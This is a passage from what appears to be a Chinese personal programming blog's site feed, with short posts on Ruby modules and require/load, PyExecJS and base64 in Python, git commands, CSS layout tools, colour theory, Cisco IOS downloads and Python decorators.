class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">Log</span></span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">class_type</span></span></span><span class="line">    <span class="hljs-string">&quot;This class is of type: <span class="hljs-subst">#&#123;<span class="hljs-keyword">self</span>.<span class="hljs-keyword">class</span>&#125;</span>&quot;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span></span><span class="line">  extend Log</span><span class="line">  <span class="hljs-comment"># ...</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">tc = TestClass.class_type</span><span class="line">puts tc  <span class="hljs-comment"># This class is of type: TestClass</span></span></code></pre></div></div><h2 id="require"><a href="#require" class="headerlink" title="require"></a>require</h2><p>用于加载库，并阻止多次加载。</p><div class="codeBlockContainer"><div class="codeBlockTitle">test_libary.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">puts <span class="hljs-string">&quot; load this libary &quot;</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test_require.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">puts (<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./test_library&#x27;</span>)</span><span class="line">puts (<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./test_library&#x27;</span>)</span><span class="line">puts (<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;./test_library&#x27;</span>)</span><span class="line"><span class="hljs-comment"># 结果为</span></span><span class="line"><span class="hljs-comment">#  load this libary </span></span><span class="line"><span class="hljs-comment"># true</span></span><span class="line"><span class="hljs-comment"># false</span></span><span class="line"><span class="hljs-comment"># false</span></span></code></pre></div></div><h2 id="load"><a href="#load" class="headerlink" title="load"></a>load</h2><p>同样用于加载库，但是不会阻止多次加载。用于模块的状态经常发生变化的情况</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">puts load <span class="hljs-string">&quot;./test_library.rb&quot;</span>  <span class="hljs-comment">#在这里不能省略 .rb, require可以省略</span></span><span class="line">puts load <span class="hljs-string">&quot;./test_library.rb&quot;</span> </span><span class="line">puts load <span class="hljs-string">&quot;./test_library.rb&quot;</span> </span><span class="line"><span class="hljs-comment">#结果</span></span><span class="line"><span class="hljs-comment"># load this libary</span></span><span class="line"><span class="hljs-comment">#true</span></span><span class="line"><span class="hljs-comment"># load this libary</span></span><span class="line"><span class="hljs-comment">#true</span></span><span class="line"><span class="hljs-comment"># load this libary</span></span><span class="line"><span class="hljs-comment">#true</span></span></code></pre></div></div><h2 id="require-relative"><a href="#require-relative" class="headerlink" title="require_relative"></a>require_relative</h2><p>相对位置的引用</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line">require_relative(<span class="hljs-string">&#x27;path&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># equal to</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">require</span>(File.expand_path(<span class="hljs-string">&#x27;path&#x27;</span>, File.dirname(<span class="hljs-keyword">__FILE__</span>)))</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ruby module 模块</title>
      <link href="/2021/10/09/ruby-module-%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/10/09/ruby-module-%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>Ruby 中的模块提供了一个独立的命名空间，可以放置方法和常量，甚至是变量。</p><h2 id="实例方法和常量的使用"><a href="#实例方法和常量的使用" class="headerlink" title="实例方法和常量的使用"></a>实例方法和常量的使用</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">MyModule</span></span></span><span class="line">  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_method</span></span></span><span class="line">    puts <span class="hljs-string">&#x27;Hello&#x27;</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line">  MY_CONSTANT = <span class="hljs-string">&#x27;constant&#x27;</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 通过模块获取常量</span></span><span class="line">puts MyModule::MY_CONSTANT <span class="hljs-comment"># =&gt; &#x27;constant&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span></span><span class="line">  <span class="hljs-keyword">include</span> MyModule</span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 通过实例使用方法</span></span><span class="line">Foo.new.my_method <span class="hljs-comment"># =&gt; &quot;Hello&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 通过类获取常量</span></span><span class="line">puts Foo::MY_CONSTANT <span class="hljs-comment"># =&gt; &#x27;constant&#x27;</span></span></code></pre></div></div><h2 id="使用模块的变量和模块方法"><a href="#使用模块的变量和模块方法" class="headerlink" title="使用模块的变量和模块方法"></a>使用模块的变量和模块方法</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">MyModule</span></span></span><span class="line">  <span class="hljs-class"><span class="hljs-keyword">class</span> &lt;&lt; self</span></span><span class="line">    <span class="hljs-keyword">attr_accessor</span> <span class="hljs-symbol">:module_var</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">module_method</span></span></span><span class="line">      puts <span class="hljs-string">&quot;module_method&quot;</span></span><span class="line">    <span class="hljs-keyword">end</span></span><span class="line">  <span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">  <span class="hljs-keyword">self</span>.module_var = <span class="hljs-string">&quot;module_var&quot;</span></span><span class="line"><span class="hljs-keyword">end</span></span><span class="line"></br></span><span class="line">puts MyModule.module_var  <span class="hljs-comment"># =&gt; &quot;module_var&quot;</span></span><span class="line">MyModule.module_method  <span class="hljs-comment"># =&gt; &quot;module_method&quot;</span></span></code></pre></div></div><h2 id="建立层级关系"><a href="#建立层级关系" class="headerlink" title="建立层级关系"></a>建立层级关系</h2><p>类似于python的import层级，ruby可以用module来建立层级关系，在module中再<code>require</code>其他的module.</p><p>这里就有个设计技巧，将<code>core</code>中<code>require</code>所有下一个层级，这样include的时候就不用再<code>require</code>了。</p><p>例如：</p><div class="codeBlockContainer"><div class="codeBlockTitle">core.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-comment"># All in this require </span></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">Aio</span></span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># debugger</span></span><span class="line">  <span class="hljs-comment">#require &#x27;byebug&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># License</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/license&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># UI</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/ui&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Base</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/base&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Text</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/text&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Module</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/module&quot;</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/module_manager&quot;</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/module_loader&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Warning</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/warning&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># Device</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/device&quot;</span></span><span class="line">    <span class="hljs-keyword">require</span> <span class="hljs-string">&quot;aio/core/device_manager&quot;</span></span></code></pre></div></div><p>其他文件只需要<code>require &#39;core&#39;</code>就可以了</p><div class="codeBlockContainer"><div class="codeBlockTitle">other_file.rb</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-ruby codeBlockLines"><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;core&#x27;</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">include</span> Aio::UI</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 模拟js</title>
      <link href="/2021/09/24/python-%E6%A8%A1%E6%8B%9Fjs/"/>
      <url>/2021/09/24/python-%E6%A8%A1%E6%8B%9Fjs/</url>
      
        <content type="html"><![CDATA[<p>推荐使用<code>PyExecJS</code></p><h2 id="PyExecJS"><a href="#PyExecJS" class="headerlink" title="PyExecJS"></a>PyExecJS</h2><p>需要安装依赖包</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cmake codeBlockLines"><span class="line">pip3 <span class="hljs-keyword">install</span> PyExecJS</span></code></pre></div></div><p>然后调用</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> execjs</span><span class="line"></br></span><span class="line">js_code = <span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-string">function add(num1, num2) &#123;</span></span><span class="line"><span class="hljs-string">    return num1 + num2;</span></span><span class="line"><span class="hljs-string">&#125;</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line">js_comp = execjs.<span class="hljs-built_in">compile</span>(js_code)</span><span class="line"></br></span><span class="line">js_comp.call(<span class="hljs-string">&#x27;add&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></code></pre></div></div><p>其他方式可以参考<a href="https://cloud.tencent.com/developer/article/1670121">这篇文章</a></p><h2 id="btoa"><a href="#btoa" class="headerlink" title="btoa"></a>btoa</h2><p>关于js的Base64编码，很多都是使用的<code>btoa</code>的方式来的。</p><p>但是由于python直接调用base64.encode()方法会不一样，所以需要做下修改</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> base64</span><span class="line"><span class="hljs-comment"># atob</span></span><span class="line">s = base64.b64decode(<span class="hljs-string">&quot;待解码的字符&quot;</span>.encode(<span class="hljs-string">&quot;utf8&quot;</span>)).decode(<span class="hljs-string">&quot;latin1&quot;</span>)</span><span class="line"><span class="hljs-comment"># btoa</span></span><span class="line">s = base64.b64encode(<span class="hljs-string">&quot;待编码的字符&quot;</span>.encode(<span class="hljs-string">&quot;latin1&quot;</span>)).decode(<span class="hljs-string">&quot;utf8&quot;</span>)</span></code></pre></div></div><p>至于解释，可以参考<a href="https://zhuanlan.zhihu.com/p/148364711">这篇文章</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>css 布局工具</title>
      <link href="/2021/09/14/css-%E5%B8%83%E5%B1%80%E5%B7%A5%E5%85%B7/"/>
      <url>/2021/09/14/css-%E5%B8%83%E5%B1%80%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://csslayout.io/">csslayout</a></li><li><a href="https://cssgr.id/">cssgr</a></li><li><a href="https://grid.layoutit.com/">grid</a></li><li><a href="https://flukeout.github.io/">cssdiner</a></li><li><a href="https://loading.io/">loading.io​</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git 使用</title>
      <link href="/2021/09/07/git-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/09/07/git-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://progit.bootcss.com/">Pro Git 第二版中文, 网站</a><br><a href="https://oschina.gitee.io/learn-git-branching/">这个</a>是一个非常好的学习网站<br><a href="https://learngitbranching.js.org/?NODEMO=&locale=zh_CN">这里</a>是一个DEMO网站</p><h2 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h2><p>使用 <code>git commmit --amend</code> 来提交一个平行的变更</p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><ul><li>查看标签 <code>git tag</code></li></ul><ul><li><p>附注标签<br><code>git tag -a v1.4 -m &#39;my version 1.4&#39;</code></p></li><li><p>轻量标签<br><code>$ git tag v1.4-lw</code></p></li><li><p>后期打标签<br><code>$ git tag -a v1.2 9fceb02</code></p></li><li><p>推送标签</p></li></ul><p><code>git push origin --tags</code></p><p><code>git push origin &lt;tag&gt;</code></p><h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><blockquote><p>合并冲突时，使用  git status 查看，冲突文件中会有标记</p></blockquote><p>可以使用合并工具高效处理 <code>git mergetool</code></p><blockquote><p>–merged 与 –no-merged 这两个有用的选项可以过滤这个列表中已经合并或尚未合并到当前分支的分支。 –merge 在这个列表中分支名字前没有 * 号的分支通常可以使用 git branch -d 删除掉；你已经将它们的工作整合到了另一个分支，所以并不会失去任何东西。</p></blockquote><h3 id="存储临时未提交的内容"><a href="#存储临时未提交的内容" class="headerlink" title="存储临时未提交的内容"></a>存储临时未提交的内容</h3><p>当遇到需要临时存储的时候，使用<code>git stash</code>来进行存储</p><p>使用 <code>git stash list</code> 查看存储内容</p><p>使用 <code>git stash pop</code> 来恢复存储内容</p><h3 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h3><p>这个不同与<code>base</code>，可以单独将其他分支的一个提交放到本分支上来</p><p><code>git cherry-pick c3</code></p><h3 id="变基"><a href="#变基" class="headerlink" title="变基"></a>变基</h3><p>其实，还有一种方法：你可以提取在 C4 中引入的补丁和修改，然后在 C3 的基础上应用一次。 在 Git 中，这种操作就叫做 变基。 你可以使用 rebase 命令将提交到某一分支上的所有修改都移至另一分支上，就好像“重新播放”一样。</p><p>在需要使用交互方式的时候加上 <code>-i</code> 即可</p><p>注意变基时候的方向, 大多数情况使用 <code>cherry-pick</code>会更好</p><p><code>$ git rebase &lt;目的分支&gt; &lt;将被移动的分支&gt;</code></p><p><strong>不要对在你的仓库外有副本的分支执行变基。</strong></p><h2 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h2><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><ul><li>克隆一个项目到本地</li></ul><p><code>git clone &lt;url&gt; --depth=1</code></p><p>这样就可以拉取最新的版本，不会有历史版本</p><p>当后面想拉取所有版本的时候，可以使用<code>git fetch --unshallow</code></p><h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h3><ul><li>拉取远端到本地新分支</li></ul><p><code>git fetch origin master:&lt;new_branch&gt;</code></p><h3 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h3><p><code>git pull</code> 在大多数情况下它的含义是一个 <code>git fetch</code> 紧接着一个 <code>git merge</code> 命令</p><h2 id="退回与恢复"><a href="#退回与恢复" class="headerlink" title="退回与恢复"></a>退回与恢复</h2><h3 id="恢复的方法"><a href="#恢复的方法" class="headerlink" title="恢复的方法"></a>恢复的方法</h3><p>重点在于列出所有的commit<br><code>git reflog</code></p><p>然后<code>checkout</code>到commit-id上就可以了</p><h3 id="回退的两种方法"><a href="#回退的两种方法" class="headerlink" title="回退的两种方法"></a>回退的两种方法</h3><p>两种回退方式应该是<code>reset</code>和<code>revert</code>，其中<code>reset</code>是本地退后，本质是checkout，而<code>revert</code>的本质是将要退的地方提交一个新的commit。</p><ul><li><code>git reset HEAD~</code></li><li><code>git revert HEAD</code></li></ul><ul><li>使用<code>reset</code>回退</li><li>使用<code>checkout</code>回退</li></ul><h4 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h4><p>分为<strong>soft</strong> 和 <strong>hard</strong> 两种，<strong>soft</strong>只会回退状态，不会改变代码。<strong>hard</strong>回退会改变代码。默认是<strong>soft</strong></p><p><code>git reset --hard [commit-id]</code></p><p>恢复即可找到之前的commit-id再reset</p><p>尽量不要使用<code>--hard</code></p><h4 id="checkout"><a href="#checkout" class="headerlink" title="checkout"></a>checkout</h4><p>使用<code>checkout</code>更加的安全方便<br><code>git checkout [commit-id]</code> 将HEAD放到这个新的分支中, 再在这个分支中修改提交后。<code>git checkout master</code> 然后<code>git merge [branch-id]</code> 即可</p><p>或者直接使用 <code>git branch -f [branch-id] &lt;commit-id&gt;</code> 将这个分支指向这个commit</p><h3 id="回退单个文件的方法"><a href="#回退单个文件的方法" class="headerlink" title="回退单个文件的方法"></a>回退单个文件的方法</h3><p>其实<code>git log</code> 和<code>git checkout</code> 后面都可以带单个文件</p><p>所以是</p><ol><li><code>git log &lt;file&gt;</code>来查看此文件的历史提交</li><li><code>git checkout &lt;hash&gt; &lt;file&gt;</code>来恢复特定版本</li></ol><h3 id="强制转移到另一个分支"><a href="#强制转移到另一个分支" class="headerlink" title="强制转移到另一个分支"></a>强制转移到另一个分支</h3><p><code>git branch -f &lt;master&gt; &lt;other_c&gt;</code></p><h2 id="ignore-问题"><a href="#ignore-问题" class="headerlink" title=".ignore 问题"></a>.ignore 问题</h2><p>对于track过的文件，后面的更改不想提交可以使用下面的方法</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">已经维护起来的文件，即使加上了gitignore，也无济于事。</span><span class="line">用下面这个命令：</span><span class="line">git <span class="hljs-keyword">update</span>-<span class="hljs-keyword">index</span> <span class="hljs-comment">--assume-unchanged logs/*.log</span></span><span class="line"></br></span><span class="line">这样每次提交就不会出现logs下面的文件了</span></code></pre></div></div><h2 id="关于远程的问题"><a href="#关于远程的问题" class="headerlink" title="关于远程的问题"></a>关于远程的问题</h2><p>当远端的历史发生变化，而自己这端提交新变更是提交不上的</p><p>解决办法是使用 <code>git fetch</code> 然后 <code>git rebase orign/master</code> 也就是将master基变到orgin/master上</p><p>简单的写法直接是<code>git pull --rebase</code></p><h3 id="远程push的同时可以创建分支"><a href="#远程push的同时可以创建分支" class="headerlink" title="远程push的同时可以创建分支"></a>远程push的同时可以创建分支</h3><p><code>git push origin &lt;branch&gt;:&lt;remoteNewBranch&gt;</code></p><h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><p>当我们需要拆分一个大项目，比如一个项目有很多个模块，每个模块都有自己的git仓库，那么我们可以使用<code>git submodule add</code>来添加模块</p><h2 id="worktree"><a href="#worktree" class="headerlink" title="worktree"></a>worktree</h2><p>当需要频繁切换分支的时候，会遇到刚做了一点，但是不想提交的情况，那么可以使用<code>git worktree add</code>来创建一个worktree</p><p>worktree就是一个文件夹，这个文件夹与分支绑定在一起，进入了这个文件夹后，git的操作就会变成在这个文件夹中进行</p><ul><li><p>创建worktree<br><code>git worktree add &lt;worktree-name&gt; &lt;branch&gt;</code></p></li><li><p>切换到worktree<br><code>cd &lt;worktree-name&gt;</code></p></li><li><p>列出所有的worktree<br><code>git worktree list</code></p></li><li><p>删除worktree<br><code>git worktree remove &lt;worktree-name&gt;</code></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>色彩原理</title>
      <link href="/2021/09/04/%E8%89%B2%E5%BD%A9%E5%8E%9F%E7%90%86/"/>
      <url>/2021/09/04/%E8%89%B2%E5%BD%A9%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="冷暖互补色"><a href="#冷暖互补色" class="headerlink" title="冷暖互补色"></a>冷暖互补色</h2><p>首先，人的眼睛有欺骗性，会将颜色的灰色部分进行补色处理，我们画画要追求这样效果，就要主动的将灰色部分进行补色处理。</p><p>第二，要明确的是，所谓的暗面，就是亮面的灰暗面，里面有个关键点是灰。</p><p>那么什么可以让亮面的颜色产生灰色呢？ 答案就是补色。</p><p>所以，将亮面的颜色和补色进行调和，就得到了趋向灰的中和色。但是，这个中和色有两个方向可以到达，这就是相对冷还是相对暖。</p><p><img src="/2021/09/04/%E8%89%B2%E5%BD%A9%E5%8E%9F%E7%90%86/1.png"></p><h2 id="固有色加上环境光"><a href="#固有色加上环境光" class="headerlink" title="固有色加上环境光"></a>固有色加上环境光</h2><p>高明度，高</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Cisco IOS 下载</title>
      <link href="/2021/08/26/Cisco-IOS-%E4%B8%8B%E8%BD%BD/"/>
      <url>/2021/08/26/Cisco-IOS-%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>下载思科的IOS，可以在官网的<a href="https://software.cisco.com/download">软件下载处</a>下载</p><p>但是，有一些IOS因为太老了，在官网上已经找不到了，那么可以在 (<a href="https://tfr.org/cisco-ios/">https://tfr.org/cisco-ios/</a>) 这里找一找。</p>]]></content>
      
      
      <categories>
          
          <category> 数通 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python 装饰器详解</title>
      <link href="/2021/08/25/python-%E8%A3%85%E9%A5%B0%E5%99%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/08/25/python-%E8%A3%85%E9%A5%B0%E5%99%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>所谓装饰器，就是在函数运行前运行的一个函数。</p><p>其中可以分为两大类的使用思路：</p><ol><li>以装饰器包裹住主体函数</li><li>以主体函数包裹住装饰器</li></ol><p>装饰器的本质就是<code>@magic  == (extend = magic(extend))</code></p><p>按照python的设计思路，其实应该多用装饰器方法，少用类</p><ul><li><a href="https://github.com/tiangolo/typer">Typer</a>这个库非常好的使用了装饰器，可以做为参考</li></ul><h2 id="以装饰器包裹住主体函数的基本型"><a href="#以装饰器包裹住主体函数的基本型" class="headerlink" title="以装饰器包裹住主体函数的基本型"></a>以装饰器包裹住主体函数的基本型</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">@magic</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span>()</span></span></code></pre></div></div><p>这个装饰器其实运行的就是将下面两行整合了</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-py codeBlockLines"><span class="line">extend = magic(extend)</span><span class="line">extend()</span></code></pre></div></div><p>所以可以推导出装饰器的基本型</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># 装饰器基本型</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in magic&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> func</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@magic  </span><span class="hljs-comment"># extend_magic = magic(extend_magic)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend_magic</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in extend_magic&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">extend_magic</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#output:</span></span><span class="line"><span class="hljs-comment">#in magic</span></span></code></pre></div></div><p>从这个基本型可以看出，在没有执行函数的时候，其实是已经执行了<code>magic(func)</code>的。</p><p>那么现在我们想在没有执行<code>extend_magic</code>的时候，不要执行<code>magic</code>中的内容要如何呢？</p><h3 id="不预执行magic"><a href="#不预执行magic" class="headerlink" title="不预执行magic"></a>不预执行magic</h3><p>修改magic函数为:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in magic&#x27;</span>)</span><span class="line">        func()</span><span class="line">    <span class="hljs-keyword">return</span> _</span></code></pre></div></div><p>这样所谓的闭包，在没有执行的时候，返回的就只是<code>_</code>这个函数。<br>所以执行<code>extend_magic()</code>后的结果为：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ebnf codeBlockLines"><span class="line"><span class="hljs-attribute">in magic</span></span><span class="line"><span class="hljs-attribute">in extend_magic</span></span></code></pre></div></div><h2 id="以主体函数包裹住装饰器的基本型"><a href="#以主体函数包裹住装饰器的基本型" class="headerlink" title="以主体函数包裹住装饰器的基本型"></a>以主体函数包裹住装饰器的基本型</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">magic</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in magic&#x27;</span>)</span><span class="line">    func()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend_magic</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in extend_magic&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-meta">    @magic</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span>():</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;in extend&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">extend_magic()</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#in extend_magic</span></span><span class="line"><span class="hljs-comment">#in magic</span></span><span class="line"><span class="hljs-comment">#in extend</span></span></code></pre></div></div><p>可以看到，这种使用方式就可以让装饰器在函数中间的某个地方执行，并且没有使用闭包的方式，因为可以不用担心在只调用对象的而不执行的地方错误的执行<code>magic</code>函数。</p><h3 id="主函数带参数的基本型"><a href="#主函数带参数的基本型" class="headerlink" title="主函数带参数的基本型"></a>主函数带参数的基本型</h3><p>上面的基本型有一个问题，执行语句<code>func()</code>在装饰器中，是不带参数的，那么要带参数应该如何呢？</p><p><del>基本想法是将主函数的属性复制到装饰器中。</del><br><del>这里就要引入<code>from functools import wraps</code>，这个包装器了，作用就是复制原函数的属性，当然也就包含了参数值。</del></p><ul><li><a href="https://zhuanlan.zhihu.com/p/45535784">wraps 原理</a></li></ul><p>python3后可以不需要引入wrpas包，也能获取到函数的参数值</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">first</span>(<span class="hljs-params">func</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;init first method&quot;</span>)</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">*args, **kargs</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method start&quot;</span>)</span><span class="line">        func(*args, **kargs)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call first method end&quot;</span>)</span><span class="line">    <span class="hljs-keyword">return</span> wrapper</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@first</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>(<span class="hljs-params">a, b</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;call func, sum: &quot;</span>, <span class="hljs-built_in">sum</span>((a, b)))</span><span class="line"></br></span><span class="line">func(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># output:</span></span><span class="line"><span class="hljs-comment">#init first method</span></span><span class="line"><span class="hljs-comment">#call first method start</span></span><span class="line"><span class="hljs-comment">#call func, sum:  3</span></span><span class="line"><span class="hljs-comment">#call first method end</span></span></code></pre></div></div><p>等价原型为</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">first(func)(<span 